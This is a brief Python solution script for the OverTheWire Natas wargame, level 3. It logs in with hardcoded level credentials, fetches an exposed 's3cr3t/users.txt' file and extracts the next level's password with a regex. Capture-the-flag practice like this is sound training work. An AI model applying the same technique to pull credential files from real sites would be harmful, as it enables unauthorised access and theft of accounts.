import requests
import re

url='http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt'
username='natas3'
password='sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14'

website=requests.get(url,auth=(username,password))
print(re.findall('natas4:(.*)',website.text))